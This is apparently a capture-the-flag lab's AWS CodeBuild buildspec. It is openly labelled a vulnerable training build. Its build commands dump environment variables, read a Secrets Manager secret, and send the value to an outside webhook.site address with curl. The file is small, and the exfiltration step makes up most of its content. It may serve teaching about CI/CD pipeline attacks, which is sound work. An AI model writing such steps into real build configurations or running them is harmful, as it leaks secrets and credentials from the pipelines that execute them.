version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20
      - echo "Done"
      - SECRET_VALUE=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1)
      - curl -X POST https://webhook.site/3638624a-31a8-4f13-b8e6-e9bd47a20e18 --data "flag=$SECRET_VALUE"
